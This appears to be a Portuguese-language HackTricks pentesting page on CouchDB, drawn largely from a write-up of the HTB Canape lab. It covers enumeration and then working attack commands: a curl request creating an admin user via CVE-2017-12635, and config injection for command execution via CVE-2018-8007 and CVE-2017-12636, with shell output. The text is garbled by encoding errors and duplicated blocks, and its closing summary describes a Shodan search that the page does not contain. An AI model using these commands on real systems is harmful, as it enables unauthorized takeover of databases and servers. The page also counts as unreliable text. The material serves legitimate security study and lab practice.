# 5984,6984 - Pentesting CouchDB

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas t√©cnicas de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## **Informa√ß√µes B√°sicas**

CouchDB √© um banco de dados orientado a documentos e em cada documento os campos s√£o armazenados como mapas de chave-valor. Os campos podem ser um par chave/valor simples, lista ou mapa.

Cada documento armazenado no banco de dados recebe um identificador √∫nico de n√≠vel de documento (`_id`) e um n√∫mero de revis√£o (`_rev`) para cada altera√ß√£o que √© feita e salva no banco de dados.

**Porta padr√£o:** 5984(http), 6984(https)
```
PORT      STATE SERVICE REASON
5984/tcp  open  unknown syn-ack
```
## **Enumera√ß√£o Autom√°tica**

### **Nmap**

O Nmap pode ser usado para identificar a porta padr√£o do CouchDB (5984) e verificar se o servi√ßo est√° em execu√ß√£o.

```
nmap -p 5984 <target>
```

### **CouchDB API**

O CouchDB possui uma API REST que pode ser usada para obter informa√ß√µes sobre o banco de dados. A API pode ser acessada em `http://<target>:5984/_utils/`.

### **Fauxton**

O Fauxton √© uma interface da web para o CouchDB que pode ser usada para visualizar e gerenciar bancos de dados. Ele pode ser acessado em `http://<target>:5984/_utils/`.

### **CouchDB User Enumeration**

O CouchDB permite que os usu√°rios sejam criados com nomes de usu√°rio e senhas. A enumera√ß√£o de usu√°rios pode ser realizada enviando uma solicita√ß√£o GET para `http://<target>:5984/_users/_all_docs`. Isso retornar√° uma lista de todos os usu√°rios do CouchDB.

### **CouchDB Database Enumeration**

A enumera√ß√£o de bancos de dados pode ser realizada enviando uma solicita√ß√£o GET para `http://<target>:5984/_all_dbs`. Isso retornar√° uma lista de todos os bancos de dados do CouchDB.
```bash
nmap -sV --script couchdb-databases,couchdb-stats -p <PORT> <IP>
msf> use auxiliary/scanner/couchdb/couchdb_enum
```
## Enumera√ß√£o Manual

### Banner
```
curl http://IP:5984/
```
Isso emite uma solicita√ß√£o GET para a inst√¢ncia instalada do CouchDB. A resposta deve se parecer com uma das seguintes:
```bash
{"couchdb":"Welcome","version":"0.10.1"}
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```
{% hint style="info" %}
Note que se ao acessar a raiz do couchdb voc√™ receber um `401 Unauthorized` com algo como: `{"error":"unauthorized","reason":"Authentication required."}` **voc√™ n√£o poder√° acessar** o banner ou qualquer outro endpoint.
{% endhint %}

### Enumera√ß√£o de Informa√ß√µes

Estes s√£o os endpoints onde voc√™ pode acessar com uma requisi√ß√£o **GET** e extrair algumas informa√ß√µes interessantes. Voc√™ pode encontrar [**mais endpoints e descri√ß√µes mais detalhadas na documenta√ß√£o do couchdb**](https://docs.couchdb.org/en/latest/api/index.html).

* **`/_active_tasks`** Lista de tarefas em execu√ß√£o, incluindo o tipo de tarefa, nome, status e ID do processo.
* \*\*`/_all_dbs`\*\* Retorna uma lista de todos os bancos de dados na inst√¢ncia do CouchDB.
* \*\*`/_cluster_setup`\*\* Retorna o status do n√≥ ou cluster, conforme o assistente de configura√ß√£o do cluster.
* **`/_db_updates`** Retorna uma lista de todos os eventos do banco de dados na inst√¢ncia do CouchDB. A exist√™ncia do banco de dados `_global_changes` √© necess√°ria para usar este endpoint.
* **`/_membership`** Exibe os n√≥s que fazem parte do cluster como `cluster_nodes`. O campo `all_nodes` exibe todos os n√≥s que este n√≥ conhece, incluindo aqueles que fazem parte do cluster.
* **`/_scheduler/jobs`** Lista de trabalhos de replica√ß√£o. Cada descri√ß√£o de trabalho incluir√° informa√ß√µes de origem e destino, ID de replica√ß√£o, um hist√≥rico de eventos recentes e algumas outras coisas.
* **`/_scheduler/docs`** Lista de estados de documentos de replica√ß√£o. Inclui informa√ß√µes sobre todos os documentos, mesmo nos estados `completed` e `failed`. Para cada documento, ele retorna o ID do documento, o banco de dados, o ID de replica√ß√£o, origem e destino e outras informa√ß√µes.
* **`/_scheduler/docs/{replicator_db}`**
* **`/_scheduler/docs/{replicator_db}/{docid}`**
* **`/_node/{node-name}`** O endpoint `/_node/{node-name}` pode ser usado para confirmar o nome do n√≥ Erlang do servidor que processa a solicita√ß√£o. Isso √© mais √∫til ao acessar `/_node/_local` para recuperar essas informa√ß√µes.
* **`/_node/{node-name}/_stats`** O recurso `_stats` retorna um objeto JSON contendo as estat√≠sticas do servidor em execu√ß√£o. A string literal `_local` serve como um alias para o nome do n√≥ local, ent√£o para todas as URLs de estat√≠sticas, `{node-name}` pode ser substitu√≠do por `_local`, para interagir com as estat√≠sticas do n√≥ local.
* **`/_node/{node-name}/_system`** O recurso \_system retorna um objeto JSON contendo v√°rias estat√≠sticas de n√≠vel do sistema para o servidor em execu√ß√£o. Voc√™ pode usar \_\_`_local` como {node-name} para obter informa√ß√µes do n√≥ atual.
* **`/_node/{node-name}/_restart`**
* **`/_up`** Confirma que o servidor est√° funcionando e pronto para responder a solicita√ß√µes. Se [`maintenance_mode`](https://docs.couchdb.org/en/latest/config/couchdb.html#couchdb/maintenance\_mode) for `true` ou `nolb`, o endpoint retornar√° uma resposta 404.
* \*\*`/_uuids`\*\* Solicita um ou mais Identificadores √önicos Universais (UUIDs) da inst√¢ncia do CouchDB.
* \*\*`/_reshard`\*\* Retorna uma contagem de trabalhos conclu√≠dos, falhados, em execu√ß√£o, parados e totais, juntamente com o estado de resharding no cluster.

Mais informa√ß√µes interessantes podem ser extra√≠das conforme explicado aqui: [https://lzone.de/cheat-sheet/CouchDB](https://lzone.de/cheat-sheet/CouchDB)

### **Lista de Bancos de Dados**
```
curl -X GET http://IP:5984/_all_dbs
```
Se a solicita√ß√£o responder com um erro 401 n√£o autorizado, ent√£o voc√™ precisa de credenciais v√°lidas para acessar o banco de dados:
```
curl -X GET http://user:password@IP:5984/_all_dbs
```
Para encontrar Credenciais v√°lidas, voc√™ pode tentar realizar uma [for√ßa bruta no servi√ßo](../generic-methodologies-and-resources/brute-force.md#couchdb).

Este √© um **exemplo** de resposta do couchdb quando voc√™ tem privil√©gios suficientes para listar bancos de dados (√© apenas uma lista de bancos de dados):
```bash
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
```
### Informa√ß√µes do Banco de Dados

Voc√™ pode obter algumas informa√ß√µes do banco de dados (como n√∫mero de arquivos e tamanhos) acessando o nome do banco de dados:
```bash
curl http://IP:5984/<database>
curl http://localhost:5984/simpsons
#Example response:
{"db_name":"simpsons","update_seq":"7-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQmPoiQFIJlkD1bHjE-dA0hdPFgdAz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavfjtx-i9gBE7X1i1D6AqAX5KwsA2vVvNQ","sizes":{"file":62767,"external":1320,"active":2466},"purge_seq":0,"other":{"data_size":1320},"doc_del_count":0,"doc_count":7,"disk_size":62767,"disk_format_version":6,"data_size":2466,"compact_running":false,"instance_start_time":"0"}
```
### **Lista de Documentos**

Lista cada entrada dentro de um banco de dados.
```bash
curl -X GET http://IP:5984/{dbname}/_all_docs
curl http://localhost:5984/simpsons/_all_docs
#Example response:
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
]}
```
### **Ler Documento**

Leia o conte√∫do de um documento dentro de um banco de dados:
```bash
curl -X GET http://IP:5984/{dbname}/{id}
curl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9
#Example response:
{"_id":"f0042ac3dc4951b51f056467a1000dd9","_rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329","character":"Homer","quote":"Doh!"}
```
## Escala√ß√£o de Privil√©gios do CouchDB [CVE-2017-12635](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-12635)

Gra√ßas √†s diferen√ßas entre os analisadores JSON do Erlang e do JavaScript, voc√™ pode **criar um usu√°rio administrador** com as credenciais `hacktricks:hacktricks` com a seguinte solicita√ß√£o:
```bash
curl -X PUT -d '{"type":"user","name":"hacktricks","roles":["_admin"],"roles":[],"password":"hacktricks"}' localhost:5984/_users/org.couchdb.user:hacktricks -H "Content-Type:application/json"
```
[**Mais informa√ß√µes sobre essa vulnerabilidade aqui**](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html).

## RCE do CouchDB

### Cookie do Erlang

Na documenta√ß√£o do CouchDB, na se√ß√£o de [configura√ß√£o de cluster](http://docs.couchdb.org/en/stable/cluster/setup.html#cluster-setup), fala sobre as diferentes portas usadas pelo CouchDB:

> O CouchDB no modo cluster usa a porta `5984` assim como em modo standalone, mas tamb√©m usa a porta `5986` para APIs locais do n√≥.
>
> O Erlang usa a porta TCP `4369` (EPMD) para encontrar outros n√≥s, ent√£o todos os servidores devem ser capazes de se comunicar nesta porta. Em um cluster Erlang, todos os n√≥s est√£o conectados a todos os outros n√≥s. Uma malha.

E ent√£o h√° um aviso interessante:

![1536931232858](https://0xdf.gitlab.io/img/1536931232858.png)

Se olharmos na lista de processos, podemos ver o cookie, "monster":
```
www-data@canape:/$ ps aux | grep couchdb
root        744  0.0  0.0   4240   640 ?        Ss   Sep13   0:00 runsv couchdb
root        811  0.0  0.0   4384   800 ?        S    Sep13   0:00 svlogd -tt /var/log/couchdb
homer       815  0.4  3.4 649348 34524 ?        Sl   Sep13   5:33 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/b
```
**Voc√™ pode ler esta se√ß√£o para aprender como abusar dos cookies do Erlang para obter RCE**.\
Al√©m disso, voc√™ pode ler alguns **writeups da m√°quina Canape HTB** [como este](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution) para ver e **praticar** como **explorar essa vulnerabilidade**.

### **CVE-2018-8007 bem-sucedido com permiss√µes de grava√ß√£o em local.ini**

Ao escrever este post, descobri que um novo CVE havia sido lan√ßado para o CouchDB pela mdsec, [CVE-2018-8007](https://www.mdsec.co.uk/2018/08/advisory-cve-2018-8007-apache-couchdb-remote-code-execution/). Ele tamb√©m requer grava√ß√µes no arquivo `local.ini`, portanto, n√£o √© uma op√ß√£o √∫til para Canape. Mas como j√° o tornamos grav√°vel como root, vamos ver se podemos faz√™-lo funcionar.

Comece com um `local.ini` limpo e agora grav√°vel (e um backup):
```
root@canape:/home/homer/etc# ls -l
total 40
-r--r--r-- 1 homer homer 18477 Jan 20  2018 default.ini
-rw-rw-rw- 1 homer homer  4841 Sep 14 17:39 local.ini
-r--r--r-- 1 root  root   4841 Sep 14 14:30 local.ini.bk
-r--r--r-- 1 homer homer  1345 Jan 14  2018 vm.args
```
Podemos usar o curl para modificar as origens no arquivo `local.ini`. A vulnerabilidade aqui √© que se usarmos o curl para colocar uma nova origem e, em seguida, novas linhas, podemos escrever coisas adicionais, incluindo um novo cabe√ßalho e detalhes. Ent√£o, vamos aproveitar o campo `[os_daemons]` e adicionar um processo para o CouchDB tentar continuar executando:
```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/cors/origins' -H "Accept: application/json" -H "Content-Type: application/json" -d "0xdf\n\n[os_daemons]\ntestdaemon = /usr/bin/touch /tmp/0xdf"
```
No shell raiz, podemos ver quais mudan√ßas:
```
root@canape:/home/homer/etc# diff local.ini local.ini.bk
119,124d118
<
< [cors]
< origins = 0xdf
<
< [os_daemons]
< test_daemon = /usr/bin/touch /tmp/0xdf
```
E ainda assim, o arquivo n√£o est√° l√°:
```
root@canape:/home/homer/etc# ls /tmp/0xdf
ls: cannot access '/tmp/0xdf': No such file or directory
```
Se olharmos para os processos em execu√ß√£o com "couchdb" na linha de comando, veremos n√£o apenas a linha de comando que nos d√° o valor do cookie que usamos anteriormente, mas tamb√©m `runsrv couchdb`:
```
root@canape:/home/homer/bin# ps aux | grep couch
root        711  0.0  0.0   4240   696 ?        Ss   14:28   0:00 runsv couchdb
root        728  0.0  0.0   4384   812 ?        S    14:28   0:00 svlogd -tt /var/log/couchdb
homer      1785  0.8  3.1 638992 31248 ?        Sl   17:55   0:01 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/bin/.. -progname couchdb -- -home /home/homer -- -boot /home/homer/bi
n/../releases/2.0.0/couchdb -name couchdb@localhost -setcookie monster -kernel error_logger silent -sasl sasl_error_logger false -noshell -noinput -config /home/homer/bin/../releases/2.0.0/sys.config
```
Se matarmos esse processo, ele volta imediatamente (observe o novo pid):
```
root@canape:/home/homer/etc# kill 711
root@canape:/home/homer/etc# ps aux | grep runsrv
root       2031  0.0  0.0  14224   980 pts/2    S+   18:09   0:00 grep --color=auto runsrv
```
E, ao reiniciar, executa os OS\_Daemons:
```
root@canape:/home/homer/etc# ls /tmp/0xdf
/tmp/0xdf
```
### **Tentativa bem-sucedida via CVE-2017-12636 com permiss√µes de grava√ß√£o em local.ini**

CVE-2017-12636 permite a execu√ß√£o de c√≥digo por meio do processo couchdb. No entanto, isso n√£o funcionar√° nesta configura√ß√£o.

Existem alguns POCs dispon√≠veis como refer√™ncia:

* [https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/exp.py](https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/exp.py)
* [https://www.exploit-db.com/exploits/44913/](https://www.exploit-db.com/exploits/44913/)

Precisamos escrever um novo query\_server e, em seguida, invoc√°-lo. Quando Canape foi lan√ßado, a maioria dos POCs era para o couchdb 1.x, mas esta caixa est√° executando o 2, portanto, o caminho query\_servers da maioria dos POCs n√£o existe. Isso mudou agora, mas seguiremos os mesmos passos. Primeiro, obtenha a vers√£o e mostre que o caminho 1.X n√£o existe:
```bash
www-data@canape:/var/www/git$ curl http://localhost:5984
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}

www-data@canape:/var/www/git$ curl http://0xdf:df@localhost:5984/_config/query_servers/
{"error":"not_found","reason":"Database does not exist."}
```
Atualize com o novo caminho para 2.0:
```bash
www-data@canape:/var/www/git$ curl 'http://0xdf:df@localhost:5984/_membership'
{"all_nodes":["couchdb@localhost"],"cluster_nodes":["couchdb@localhost"]}

www-data@canape:/var/www/git$ curl http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers
{"coffeescript":"./bin/couchjs ./share/server/main-coffee.js","javascript":"./bin/couchjs ./share/server/main.js"}
```
A partir da√≠, devemos adicionar um query\_server e depois invoc√°-lo, mas n√£o conseguimos.
```bash
www-data@canape:/var/www/git$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
{"error":"badmatch","reason":"{badrpc,{'EXIT',{{{badmatch,{error,eacces}},\n                  [{config_writer,save_to_file,2,\n                                  [{file,\"src/config_writer.erl\"},{line,38}]},\n                   {config,handle_call,3,[{file,\"src/config.erl\"},{line,222}]},\n                   {gen_server,try_handle_call,4,\n                               [{file,\"gen_server.erl\"},{line,629}]},\n                   {gen_server,handle_msg,5,\n                               [{file,\"gen_server.erl\"},{line,661}]},\n                   {proc_lib,init_p_do_apply,3,\n                             [{file,\"proc_lib.erl\"},{line,240}]}]},\n                 {gen_server,call,\n                             [config,\n                              {set,\"query_servers\",\"cmd\",\n                                   \"/sbin/ifconfig > /tmp/df\",true,nil}]}}}}","ref":1617834159}
```
Algumas pesquisas mostram que este √© um problema de permiss√µes. Na verdade, se verificarmos com o nosso shell root, podemos ver que o arquivo `local.ini` n√£o √© grav√°vel por ningu√©m, muito menos www-data:
```
root@canape:/home/home/etc# ls -ls local.ini
8 -r--r--r-- 1 homer homer 4841 Sep 14 17:11 local.ini
```
Ent√£o, isso √© um beco sem sa√≠da para o Canape. Mas se quisermos tentar faz√™-lo funcionar, podemos torn√°-lo leg√≠vel com nosso acesso root ou homer e continuar por este caminho. Faremos um backup do original para que possamos ver quais mudan√ßas foram feitas:
```
root@canape:/# cp /home/homer/etc/local.ini /home/homer/etc/local.ini.b
root@canape:/# chmod 666 /home/homer/etc/local.ini
```
Agora, voltando para nossa shell www-data:
```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
""
```

```
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
""
```
Obtemos de volta o valor anterior para o servidor de consulta cmd, o que significa sucesso. E no shell raiz, podemos ver que funcionou:
```
root@canape:/home/homer/etc# diff local.ini local.ini.bk
48c48
< cmd = /sbin/ifconfig > /tmp/df
---
> cmd =
```
Agora, dever√≠amos ser capazes de criar um banco de dados, e ent√£o um documento nesse banco de dados, e solicitar com uma visualiza√ß√£o que mapeia nosso query\_server para obter a execu√ß√£o.

Criar banco de dados e documento:
```bash
www-data@canape:/dev/shm$ curl 'http://0xdf:df@localhost:5984/_all_dbs'
["_global_changes","_metadata","_replicator","_users","god","passwords","simpsons","vultest"]
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df'
{"ok":true}
www-data@canape:/dev/shm$ curl 'http://0xdf:df@localhost:5984/_all_dbs'
["_global_changes","_metadata","_replicator","_users","df","passwords","simpsons"]

www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df/zero' -d '{"_id": "HTP"}'
{"ok":true,"id":"zero","rev":"1-967a00dff5e02add41819138abb3284d"}
```

```
www-data@canape:/dev/shm$ curl 'http://0xdf:df@localhost:5984/_all_dbs'
["_global_changes","_metadata","_replicator","_users","god","passwords","simpsons","vultest"]
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df'
{"ok":true}
www-data@canape:/dev/shm$ curl 'http://0xdf:df@localhost:5984/_all_dbs'
["_global_changes","_metadata","_replicator","_users","df","passwords","simpsons"]

www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df/zero' -d '{"_id": "HTP"}'
{"ok":true,"id":"zero","rev":"1-967a00dff5e02add41819138abb3284d"}
```
Solicite-o em uma visualiza√ß√£o:
```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df/_design/zero' -d '{"_id": "_design/zero", "views": {"anything": {"map": ""} }, "language": "cmd"}' -H "Content-Type: application/json"
```
## Resumo

Este artigo apresenta informa√ß√µes sobre como realizar testes de penetra√ß√£o em bancos de dados CouchDB. O artigo come√ßa com uma pesquisa no Shodan para encontrar inst√¢ncias do CouchDB em execu√ß√£o na porta 5984. Em seguida, o artigo apresenta refer√™ncias para an√°lise de vulnerabilidades e execu√ß√£o de comandos no CouchDB.
